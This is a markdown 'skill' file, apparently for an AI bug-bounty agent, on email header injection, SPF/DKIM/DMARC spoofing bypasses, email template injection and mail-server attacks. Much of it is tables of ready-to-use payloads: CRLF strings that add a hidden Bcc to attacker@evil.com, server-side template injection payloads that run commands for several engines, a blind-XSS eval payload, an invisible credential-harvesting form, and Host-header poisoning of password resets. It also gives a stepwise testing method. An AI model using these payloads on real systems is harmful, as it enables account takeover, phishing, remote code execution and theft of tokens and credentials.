---
name: email-header-injection
description: SMTP header injection, email spoofing, template injection, and mail infrastructure exploitation
depends_on: [crlf_injection]
---

# Email Header Injection & Mail Infrastructure Exploitation

SMTP headers are `Name: Value\r\n` pairs constructed from user input across contact forms, invite flows, password resets, and notification systems. A single CRLF in a name field turns a contact form into a spam relay. A poisoned Host header in a reset flow turns a forgotten-password link into an ATO primitive. This skill covers injection into the email protocol layer, spoofing that bypasses authentication, template engine exploitation in email contexts, and the infrastructure attacks that chain from these primitives. Complements `crlf_injection` (HTTP-level CRLF) -- this skill focuses on what is UNIQUE to email: SMTP protocol injection, SPF/DKIM/DMARC bypass, email template engines, and email-to-ATO chains.

## Discovery Signals

| # | Signal | Where to Find | Why Vulnerable |
|---|--------|---------------|----------------|
| 1 | Contact / feedback form with name + subject + message | `/contact`, `/feedback`, `/support` | Name and subject fields flow directly into SMTP headers without sanitization |
| 2 | Invite or share flow with custom message | `/invite`, `/share`, invite-a-friend features | Recipient address + custom message = full SMTP header and body control surface |
| 3 | Password reset triggering email with link | `/forgot-password`, `/reset` | Host header or X-Forwarded-Host flows into reset URL in email body |
| 4 | Email change or verification flow | `/settings/email`, `/profile` | Confirmation routing logic: which address receives the token? State machine bugs |
| 5 | SaaS SMTP configuration panel | Admin settings, notification config | Host/port/credential fields written to INI/YAML config: CRLF = config injection = RCE ($5K Grafana) |
| 6 | Transactional email provider integration | SendGrid, Mailgun, SES API keys in client-side JS or `.env` | Provider API accepts raw headers or template variables; leaked key = full send-as capability |
| 7 | Custom reply-to in account settings | Campaign builder, support ticketing config | User-controlled Reply-To header persists across all outbound sends |
| 8 | Inbound email auto-parser | `support@`, `reply+token@`, ticketing endpoints | Auto-action on received email: injected headers become ticket metadata |
| 9 | Email template preview in admin panel | `/preview-email`, template editor | Template engine rendering user input: SSTI surface in email context |
| 10 | OAuth/SSO with email-based identity merge | `/auth/callback`, signup flow | IdP supplies unverified email; relying party merges accounts by email without re-verification |
| 11 | Client-side email composition (SPA) | AngularJS/React frontend PUT/POST to `/api/mail` | Frontend constructs email body and headers; backend relay accepts arbitrary JSON fields |
| 12 | Newsletter subscribe with name field | `/subscribe`, `/newsletter` | Name field reaches SMTP From display name; CRLF injects additional headers |
| 13 | Careers/onboarding portal with email-only auth | Sub-property login pages, candidate settings | Identification conflated with authentication: submit email = get session (Waymo $50K) |

## Attack Surface

- **SMTP header sinks**: From, To, Cc, Bcc, Reply-To, Subject, MIME Content-Type, custom X-headers, MAIL FROM envelope
- **Email body sinks**: template engine variables (Jinja2, Twig, EJS, ERB, Freemarker), HTML injection in non-escaped fields, CSS injection in `<style>` blocks
- **URL generation sinks**: reset/confirmation links built from `request.host`, `X-Forwarded-Host`, `Forwarded` header
- **Configuration sinks**: SMTP host/port fields in SaaS admin panels written to INI/YAML files
- **Relay endpoints**: unauthenticated `/api/mail` or `/api/send` endpoints accepting full envelope parameters
- **Inbound parsing sinks**: auto-ticket-creation, reply-to-thread, auto-responders that echo attacker-controlled content

## SMTP Header Injection

### Injection Point Matrix

| Input Field | Injection Technique | Header Affected | Impact |
|-------------|---------------------|-----------------|--------|
| From / Display Name | `"CEO <ceo@corp.com>"%0d%0aBcc:spy@evil.com` | From + injected Bcc | Spoof display name + silent copy to attacker |
| To field | `user@example.com%0d%0aCc:attacker@evil.com` | To + injected Cc | Copy attacker on victim's correspondence |
| Cc field | `first@x.com%0d%0aBcc:second@evil.com` | Cc + injected Bcc | Add hidden recipients to existing Cc list |
| Bcc field | `hidden@x.com%0d%0aSubject:Phishing Subject` | Bcc + injected Subject | Override subject line for phishing |
| Subject | `Hello%0d%0a%0d%0aInjected body content` | Subject + body injection | Double CRLF terminates headers, replaces entire email body |
| Reply-To | `legit@example.com%0d%0aFrom:ceo@example.com` | Reply-To + spoofed From | Spoof sender while capturing replies |
| Custom X-headers | `value%0d%0aBcc:attacker@evil.com` | X-Custom + injected Bcc | Inject via app-specific headers devs do not sanitize |
| MIME Content-Type | `text/plain%0d%0aMIME-Version: 1.0%0d%0aContent-Type: multipart/mixed; boundary=x` | Content-Type + MIME structure | Inject attachments, switch to HTML body, add inline images |
| MAIL FROM (envelope) | `attacker@evil.com%0d%0aRCPT TO:victim@target.com` | SMTP command injection | Add recipients at protocol level, bypass application-layer CC/BCC restrictions |
| Display Name (RFC 5321) | `"\r\nRCPT TO:<attacker@evil.com>"@domain.com` | Envelope RCPT TO | Quoted local-part carries SMTP commands through email validators |

### Injection Payload Matrix

| Payload | Effect | Bypass | Works When |
|---------|--------|--------|------------|
| `%0d%0aBcc:attacker@evil.com` | Silent BCC to attacker | Canonical CRLF | No CRLF sanitization on header values (PHP `mail()`) |
| `%0aBcc:attacker@evil.com` | BCC via bare LF | LF-only (most MTAs accept) | Filter checks `\r\n` but not `\n` alone |
| `%0d%0a%0d%0a<html><body>Phishing</body></html>` | Full body replacement | Double CRLF terminates headers | Subject or header field with no length limit |
| `%c0%8d%c0%8aBcc:spy@evil.com` | BCC via overlong UTF-8 | Legacy C decoders accept 2-byte encoding of single-byte chars | Older CGI, Perl scripts, custom C-based MTA parsers |
| `%00%0aBcc:spy@evil.com` | BCC via null-byte prefix | Null short-circuits C-string length checks | PHP `mail()` on older versions, Perl `Net::SMTP` |
| `\r\nBcc:spy@evil.com` | JSON-context BCC injection | Literal `\r\n` in JSON body parsed to SMTP | App parses JSON, passes string to SMTP without re-encoding |
| `victim@x.com%0d%0aCc:attacker@evil.com` | CC injection via To field | App validates format but not content | Email format regex passes before CRLF reaches MTA |
| `=?UTF-8?B?DQpCY2M6c3B5QGV2aWwuY29t?=` | BCC via MIME encoded-word | Base64-encoded CRLF+header decoded by MTA | MIME-word decoding after sanitization (header decoding differential) |
| `%E5%98%8A%E5%98%8DBcc:spy@evil.com` | BCC via Unicode normalization | U+560A/U+560D normalize to CR/LF on some stacks | Unicode-aware string normalization before SMTP send (Twitter CRLF class) |
| `email=victim@x.com&email=attacker@evil.com` | HPP: token sent to both addresses | Parameter pollution | Backend iterates over all email params for RCPT TO |
| `{"email":["victim@x.com","attacker@evil.com"]}` | JSON array: both receive reset | Array deserialization | Backend unpacks array into recipient list |

**Language/Library-specific SMTP behavior**:

| Language/Library | CRLF Handling | Notes |
|------------------|---------------|-------|
| PHP `mail()` | Passes raw headers to sendmail; no built-in CRLF sanitization | Direct injection; most common sink in legacy contact forms |
| Python `smtplib` | `email.message` API escapes; raw `sendmail()` does not | Test both paths; many apps use raw string formatting |
| Node.js `nodemailer` | Strips CRLF in versions >=6.4.6 | Older versions vulnerable; test `%0d%0a` and bare `%0a` |
| Ruby `Mail` gem | Encodes by default | `Mail.new` with raw header strings bypasses encoding |
| Java `javax.mail` | `MimeMessage.addHeader()` does not sanitize | Direct injection via header API; widespread in enterprise |
| Go `net/smtp` | No sanitization on `SendMail()` data parameter | Raw protocol; all injection variants work |
| .NET `SmtpClient` | Strips bare LF; accepts `%0d%0a` in some versions | Test URL-encoded CRLF specifically |
| Perl `Net::SMTP` | No sanitization | Legacy CGI contact forms are prime targets |
| WordPress `wp_mail()` | PHPMailer underneath; recent versions sanitize | Plugins using raw `mail()` bypass PHPMailer protection |

## Email Spoofing & Authentication Bypass

### SPF/DKIM/DMARC Bypass Matrix

| Check | Bypass Technique | Condition | Impact |
|-------|------------------|-----------|--------|
| SPF `-all` on apex | Spoof from subdomain without own SPF record | `sp=none` or no subdomain DMARC policy | Full impersonation from `noreply.target.com` |
| SPF `include:sendgrid.net` | Any SendGrid customer sends as target domain | Shared-pool provider in SPF record | Spoof from any SendGrid account; passes SPF |
| SPF `include:_spf.google.com` | Use Google Workspace trial to send as target | Target includes Google SPF but any Workspace org can send | Legitimate Google IP passes SPF for target domain |
| DKIM selector on apex only | Send from subdomain with no DKIM selector published | `adkim=r` (relaxed DKIM alignment) in DMARC | Passes DMARC via subdomain alignment without valid DKIM |
| DKIM replay | Capture legitimate DKIM-signed email, modify unsigned headers, resend | DKIM `h=` field does not cover From display name or other unsigned headers | Attacker modifies visible From while DKIM signature remains valid |
| DMARC `p=reject` | Exploit relaxed alignment (`aspf=r` or `adkim=r`) via sibling subdomain | Org-domain match with relaxed alignment mode | Passes DMARC from `mail.target.com` even if `target.com` has strict policy |
| DMARC `p=reject` | SMTP smuggling: split message at MTA boundary | Pre-patch Postfix (CVE-2023-51764)/Sendmail/Exim | Second message after split bypasses all authentication checks |
| DMARC `p=none` | Direct spoofing with monitoring only | Many orgs deploy `p=none` and never progress to reject | Full spoofing; DMARC only generates reports, does not block |
| All defenses | ARC header injection from "trusted" intermediary | Receiver trusts ARC seal from attacker-controlled domain | Inject fake ARC chain to override DMARC failure |
| All defenses | Null MX record abuse (`MX 0 .`) | Some MTAs still accept delivery to domains with null MX | Bypass MX-based validation assumptions |

### Domain Spoofing Techniques

| Technique | Example | What It Bypasses | Detection |
|-----------|---------|------------------|-----------|
| Subdomain with no SPF | `fake@internal.target.com` | SPF only on apex; subdomain inherits `sp=none` | Check `_dmarc.target.com` for `sp=` tag |
| Shared provider spoofing | Sign up for SendGrid trial, send as `target.com` | SPF `include:sendgrid.net` trusts all SendGrid IPs | Check SPF includes for shared infrastructure |
| Display name spoofing | `"Security Team <noreply@target.com>" <attacker@evil.com>` | Human visual parsing; email clients show display name prominently | Inspect actual From header vs display name |
| Homoglyph domain | `target.com` with Cyrillic `a` (`tаrget.com`) | Visual match bypasses human verification | IDN/Punycode analysis; compare Unicode codepoints |
| Cousin domain | `target-security.com`, `target-support.com` | No SPF/DKIM/DMARC required on attacker-owned domain | WHOIS/registration date check |
| Reply-To divergence | From: `legit@target.com`, Reply-To: `attacker@evil.com` | Email appears from target; replies go to attacker | Most clients do not show Reply-To by default |
| Envelope vs header From | Envelope MAIL FROM: `bounce@target.com`, Header From: `ceo@target.com` | SPF checks envelope; user sees header From | Raw source inspection; `Return-Path:` vs `From:` mismatch |
| SMTP smuggling | Inject second message after `\n.\n` sequence difference | Pre-patch MTA boundary parsing differential | Updated MTA patches; check MTA version headers |

## Email Template Injection

### Template Engine Exploitation

| Framework/Service | Injection Point | Payload | Impact |
|-------------------|-----------------|---------|--------|
| Jinja2 (Python/Flask/Django) | Display name in invite, custom message | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` | RCE on mail server; output appears in email body |
| Twig (PHP/Symfony/Laravel) | Order description, support reply | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` | RCE via filter callback registration |
| EJS (Node.js/Express) | Newsletter custom content | `<%= global.process.mainModule.require('child_process').execSync('id') %>` | RCE via Node.js process module |
| ERB (Ruby/Rails ActionMailer) | Email signature editor | `<%= system("id") %>` or `` <%= `id` %> `` | RCE via Ruby system call |
| Go text/template | Notification template in SaaS config | `{{printf "%v" .}}` then function-map dependent payloads | RCE if `exec` is mapped; info disclosure via `printf` |
| Freemarker (Java/Spring) | Transactional email variable | `${"freemarker.template.utility.Execute"?new()("id")}` | RCE via Execute utility class |
| Velocity (Java legacy) | Legacy campaign builder | `#set($rt=$x.class.forName("java.lang.Runtime"))` chain | RCE via Java reflection |
| SendGrid dynamic templates | Handlebars variable in campaign | `{{#each (lookup this "constructor")}}` prototype chain | Data exfiltration; limited execution via helpers |
| Mailchimp merge tags | `*|MERGE|*` with HTML in user field | `*|HTML:FNAME|*` renders unsanitized HTML from contact field | HTML injection in sent campaigns; phishing via legitimate sender |
| SES templates (AWS) | Template variable from user input | `{{name}}` with `<img src=//evil/track>` | HTML injection with DKIM-signed delivery; pixel tracking |

### Content Injection

| Context | Technique | What You Control | Impact |
|---------|-----------|------------------|--------|
| HTML email body (no JS filter) | `<a href="https://evil.com/phish">Click to verify</a>` | Link targets, button labels, visible text | Phishing from legitimate sender domain with valid DKIM |
| Workspace/org name in notification | Set org name to `<img src=//evil/pixel>` | Admin-set field rendered in all member notifications | Tracking pixel in every notification email (Slack $250) |
| Invoice memo/description | `<form action="//evil"><input type=password style=opacity:0><button>Load more</button></form>` | Hidden credential form with autofill bait | Credential theft via browser autofill in email render (Stripe $500) |
| Registration reason in admin email | `"><img src=x onerror="eval(atob(this.id))" id="base64payload">` | Blind XSS payload in admin notification | XSS in admin email client WebView with file:// access (Rocket.Chat) |
| Email subject line | Subject containing `<script>` for webmail render | Subject displayed in webmail inbox list | XSS if webmail renders subject without escaping |
| `<base href>` injection | `<base href="https://evil.com">` before relative links | All relative URLs in the email | Every link in the email resolves to attacker domain |

## Mail Infrastructure Attacks

| Target | Attack | Technique | Impact |
|--------|--------|-----------|--------|
| Exposed mail relay endpoint | Unauthenticated send-as trusted domain | `PUT /api/mail` with arbitrary From/To/Body; DKIM/SPF passes because relay IP is whitelisted | Phishing from .gov/.mil/.corp domain with full auth (DoD report) |
| Autodiscover endpoint | Credential theft via `autodiscover.target.com` or subdomain takeover | Dangling CNAME on `autodiscover.*` or Autodiscover V2 NTLM relay | Outlook client sends credentials automatically on startup |
| MX record to shared hosting | Subdomain with MX pointing to expired/claimable host | Register the MX target hostname; receive all mail for subdomain | Full email interception for the affected subdomain |
| IMAP/POP3 without STARTTLS | Passive credential sniffing on unencrypted mail retrieval | Network position (same WiFi, ISP, corporate LAN) | Plaintext passwords and email content |
| Exchange/OWA exposed | CVE exploitation (ProxyLogon, ProxyShell, ProxyNotShell) | Direct exploitation of Internet-facing Exchange servers | RCE on mail server; read all org email; lateral movement |
| Postfix SMTP smuggling | `\n.\n` vs `\r\n.\r\n` parsing differential between MTAs | Send crafted message that splits at MTA boundary (CVE-2023-51764) | Bypass SPF/DKIM/DMARC for second injected message |
| Mail gateway/appliance | WAF-style email scanning bypass via MIME multipart nesting | Deeply nested MIME parts exceed scanner recursion limits | Malware/phishing payload bypasses email security gateway |
| MTA-STS misconfiguration | Missing or expired MTA-STS policy | MITM on SMTP delivery; downgrade TLS to plaintext | Read and modify email in transit |

## Defense-Bypass Pairs

| Defense | Bypass Technique | Real Example |
|---------|------------------|--------------|
| CRLF stripping on From field | Inject via Cc, Reply-To, X-Custom headers (less-common paths skip sanitizer) | PHP `mail()` sanitizes 5th-param From but not additional_headers |
| Host header validation on reset | `X-Forwarded-Host: evil.com` or `Forwarded: host=evil.com` bypasses direct Host check | oslo.io / DoD reset poisoning via X-Forwarded-Host |
| DMARC `p=reject` on apex | Spoof from subdomain with `sp=none` or no subdomain DMARC policy | Subdomain spoofing bypasses org-level reject policy |
| HTML sanitizer on email body | CSS numeric escapes (`\00003c` = `<`): sanitizer sees CSS, browser decodes HTML | HEY.com $5K: CSS escape in `<style>url()` smuggles HTML past Loofah |
| Email confirmation required | Race condition: change email after token issued, before consumed | Shopify $15K-$16K: three variants of same confirmation routing bug |
| OAuth `email_verified` UI gate | Replay `POST /oauth/authorize` directly, skip UI interstitial | GitLab $1.5K: Salesforce unverified email merged accounts via SSO |
| Rate limit on password reset | Email param pollution (`email=victim&email=attacker`) triggers reset for victim via attacker's quota | Compendium pattern: HPP bypasses per-account rate limit |
| Template variable escaping | Switch to `<style>` context where CSS escaping rules differ from HTML escaping | Webmail template injection via CSS context escape |
| Single-use reset token | Token-in-Referer leak to third-party analytics scripts before victim uses it | Token disclosed via Referer header on page navigation |
| SMTP CRLF filter (`\r\n` only) | Bare LF (`%0a`), overlong UTF-8 (`%c0%8d%c0%8a`), or Unicode normalization (`%E5%98%8A%E5%98%8D`) | Twitter $1.7K: Unicode CRLF bypass via U+560A/U+560D |

## Chain Patterns

| Base Finding | Chain With | Combined Impact | Example |
|--------------|-----------|-----------------|---------|
| Host header in reset URL | Victim clicks poisoned link | Token theft to full ATO | DoD/oslo.io: Host poisoning + token capture ($5K-$50K common) |
| SMTP header injection (BCC) | BCC on password reset emails | Silent token exfiltration at scale | BCC injection on transactional system = all reset tokens |
| OAuth unverified email bypass | Relying party merges by email | ATO on all downstream services | GitLab via Salesforce: $1.5K for SSO email merge |
| SSTI in email template | Custom message in invite flow | RCE on mail server | Grafana/Aiven $5K: Jinja2/Go template via SMTP config |
| CSS sanitizer bypass in webmail | Framework gadget (Stimulus `data-controller`) | Silent email forwarding = persistent surveillance | HEY.com $5K: CSS escape + Stimulus beacon auto-submit |
| SMTP config CRLF in SaaS | Config file injection (INI section) | Tenant-to-host RCE on managed service | Grafana SMTP host CRLF = INI injection = RCE |
| Email param pollution | Reset sent to victim + attacker | Attacker receives copy of reset token | HPP/JSON array on forgot-password endpoint |
| HTML injection in email body | Browser autofill on rendered form | Credential theft without JavaScript | Stripe $500: invisible form in invoice memo |
| Blind XSS in admin email field | Admin views notification in mobile WebView | XSS with file:// access in email client | Rocket.Chat: registration reason XSS in admin approval email |
| Gmail image proxy auto-fetch | Leaked token in image URL | 0-click ATO via image prefetch | Meta $44.6K: Facebook ATO via Gmail auto-fetched image |

## Key Vulnerabilities

### Password Reset Poisoning via Host Header
The application builds reset URLs from `request.host` or `X-Forwarded-Host`. Attacker submits reset for victim's email with `Host: evil.com`. Victim receives email with `https://evil.com/reset?token=TOKEN`. Clicking delivers the token to the attacker. Proven at $5K-$50K across DoD, Google properties, oslo.io/Logitech, and dozens of smaller programs. The fix (hardcode domain from config, never from request) is simple but universally under-deployed.

### SMTP Command Injection via Email Validators
RFC 5321 quoted local-part syntax allows `"\r\nRCPT TO:<attacker>"@domain.com` to pass email format validators while injecting raw SMTP commands. When the MTA processes the MAIL FROM or RCPT TO with the injected commands, the attacker adds arbitrary recipients or changes envelope routing. PHP `mail()`, Perl `Net::SMTP`, and Go `net/smtp` are the primary sinks because they pass raw strings to the MTA without re-validation.

### Client-Side Email Composition Relay Abuse
When SPAs construct email content client-side and POST to a backend relay endpoint, the relay often accepts arbitrary From/To/Subject/Body without authentication or rate limiting. Because the relay's IP is whitelisted in SPF and emails are DKIM-signed at the org level, every email sent through the relay passes authentication. DoD program reports documented .gov/.mil relays serving as phishing weapons.

### Email Verification Bypass in OAuth/SSO Flows
Identity providers vary in whether they verify email at user creation. Salesforce admin-created users have unverified emails. When a relying party (GitLab, Bitbucket, etc.) merges accounts by email from the IdP assertion without re-verification, an attacker controlling a Salesforce org can claim any email identity on the relying party.

## Testing Methodology

1. **Map all email-producing flows**: signup confirmation, password reset, invite, share, contact form, subscribe, notification settings, admin SMTP config, email change. Each is a separate injection surface.
2. **CRLF in every field**: For each email-producing endpoint, inject `%0d%0a`, `%0a`, `%c0%8d%c0%8a`, and `%00%0a` variants into name, email, subject, message, reply-to, and custom fields. Check received email raw source via `Show Original` for injected headers on separate lines.
3. **Host header on reset flows**: Send `/forgot-password` with `Host: evil.com`, `X-Forwarded-Host: evil.com`, `Forwarded: host=evil.com`, double Host headers, and `Host: example.com@evil.com`. Inspect the reset URL in the email.
4. **Email parameter pollution**: Test HPP (`email=a@x&email=b@y`), JSON arrays (`{"email":["a","b"]}`), comma separation (`email=a,b`), and SMTP-syntax injection (`email=victim%0d%0aCc:attacker`).
5. **Template injection detection**: In invite/share custom messages, inject `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`. Check if the email body contains `49`. Escalate through data exfil to RCE per engine.
6. **SPF/DKIM/DMARC audit**: `dig txt target.com`, `dig txt _dmarc.target.com`, enumerate subdomains and check each for missing SPF/DMARC records. Test actual spoofed delivery to Gmail and check `Show Original` for pass/fail results.
7. **Email change race condition**: Start email change, change again before confirming first. Confirm first change. Check which email is verified and whether tokens are invalidated.
8. **OAuth email verification bypass**: Register on target IdP with victim email, never verify. Attempt SSO login. If UI gates the flow, replay `POST /oauth/authorize` directly.
9. **Inbound email header injection**: Send raw SMTP message with injected headers to `support@` or `reply+token@`. Check if the app processes injected fields as legitimate metadata.
10. **SMTP config injection (SaaS)**: In admin panels, set SMTP host to `evil.com\r\n[section]\nkey=value`. Check if newline breaks config file and injects new sections.

## Validation

1. **SMTP header injection**: received email raw source (`Show Original`) showing injected Bcc/Cc/From on its own line. Not just reflected in body text.
2. **Reset poisoning**: screenshot of reset email with attacker domain in link + successful password change using the captured token.
3. **Template injection**: email body showing `49` from `{{7*7}}`, or command output (`id`/`whoami`) from RCE payload.
4. **Spoofing**: full `Show Original` from Gmail showing SPF/DKIM/DMARC results AND inbox placement (Primary tab, not Spam).
5. **Email change race**: timestamps proving the race window + confirmation applied to wrong address.
6. **Config injection**: resulting behavior change (new template path evaluated, error showing injected section).
7. **OAuth bypass**: login as victim on relying party after skipping email verification on IdP.

## False Positives

- CRLF in email body text (not headers) is cosmetic, not SMTP injection, unless template-rendered as HTML
- Host header reflected in `<link rel=canonical>` but NOT in reset/confirmation URLs is cache-poisoning only, not ATO
- SPF softfail alone (`~all`) without DMARC `p=none` -- modern receivers reject or spam-folder; prove inbox delivery before reporting
- OAuth providers that return `email_verified: false` and the relying party correctly checks and rejects it
- Email alias handling (`+tag`, dot-ignore) that the platform explicitly documents as intended behavior
- Template syntax in email body that is HTML-escaped (shows literal `{{7*7}}`, no evaluation) is not SSTI
- Reset poisoning behind a CDN that overwrites Host before the app sees it -- test must prove poisoned host reaches the mailer
- Display name spoofing alone (From header differs from display name) is not a vulnerability in most programs unless combined with passing SPF/DKIM

## Impact

- **Account takeover** via reset token theft, OAuth merge, or email verification bypass ($5K-$50K)
- **RCE** via SMTP config injection in managed SaaS or template injection in email rendering ($5K+)
- **Mass email exfiltration** via BCC injection on transactional email systems
- **Trusted-domain phishing** via open relay or shared-provider SPF spoofing with valid DKIM signatures
- **Persistent surveillance** via silent email forwarding rules set through XSS/CSRF in webmail ($5K HEY.com)
- **Credential theft** via HTML injection with invisible autofill forms in email renderers ($500 Stripe)
- **Cross-tenant takeover** via email confirmation routing bugs chained with SSO account merge ($15K Shopify)
- **Identity impersonation** via SPF/DKIM bypass enabling business email compromise campaigns
- **Credential disclosure** via transitional auth endpoints that return email and password without session validation ($15.3K PayPal)
- **Infrastructure compromise** via exposed Exchange/MTA exploitation or Autodiscover credential relay

## Pro Tips

1. The highest-paying email bugs are ATO chains, not DNS findings. Reset poisoning + token theft = $5K-$50K across programs. SPF `p=none` alone = Informational unless you deliver a spoof to Primary inbox with screenshots.
2. SMTP config fields in SaaS admin panels (Grafana, Sentry, GitLab, Kibana) are a recurring $5K+ RCE class. CRLF in the SMTP host injects into INI/YAML config files that the service reloads. Multi-tenant managed services for OSS products are a goldmine for tenant-to-host escalation.
3. When SMTP CRLF filters block `%0d%0a`, test bare LF (`%0a` -- works on most MTAs), overlong UTF-8 (`%c0%8d%c0%8a`), and Unicode normalization characters (`%E5%98%8A%E5%98%8D`). These bypass the canonical check on many stacks.
4. For email parameter pollution, test all three shapes: `email=a&email=b` (HPP), `{"email":["a","b"]}` (JSON array), `email=a,b` (comma). Different backends pick first, last, or both. Reset poisoning via HPP is a distinct bug class from Host header poisoning.
5. CSS numeric escapes (`\00003c` for `<`) bypass HTML sanitizers in webmail renderers because the sanitizer treats `<style>` content as opaque CSS while the browser decodes the escapes. This is a $5K+ class in every webmail product (HEY.com, Gmail, Yahoo, Proton).
6. Email change flows have a state machine. Test unintuitive order: change before confirming original, change twice before confirming once, change back to original after token issued. Shopify paid $15K-$16K on three variants of the same confirmation routing bug.
7. Inbound email auto-parsing (`support@`, `reply+token@`) is undertested. Send a raw SMTP message with injected headers and observe if the system auto-actions (ticket creation with injected fields). The target's inbound MX accepts any valid envelope.
8. When reporting email spoofing, always deliver a real spoof to Gmail and Outlook Primary tab. Full `Show Original` with SPF/DKIM/DMARC pass results AND Primary inbox placement is the proof that converts Informational to Medium+.
9. Sub-properties of large companies (careers portals like Waymo, partner dashboards, legal tools) run custom auth weaker than the main login. Google paid $50K for a Waymo careers portal where typing any email + blank name = logged in as that user.
10. API method-equivalence matters: if a product offers 4 ways to set the same header, test each with CRLF payloads independently. Sanitizers are bolted onto the most common path; positional/indexed variants are frequently missed. Google paid $133.7K for Apigee's 4th header-setting method being unsanitized while the other 3 were clean.

## Summary

Email injection sits at the intersection of SMTP protocol abuse, template engine exploitation, and authentication bypass chains. The attack surface spans every flow that produces an email (reset, invite, contact, notification) and every component that processes one (MTA, webmail renderer, inbound parser). The highest-value bugs are not DNS misconfigurations but ATO chains: Host header reset poisoning, OAuth email verification bypass, and SMTP config injection in managed SaaS. Test every email-producing endpoint with CRLF variants in every field, poison every Host-derived URL, and trace every user-controlled string that reaches a template engine or email header sink.
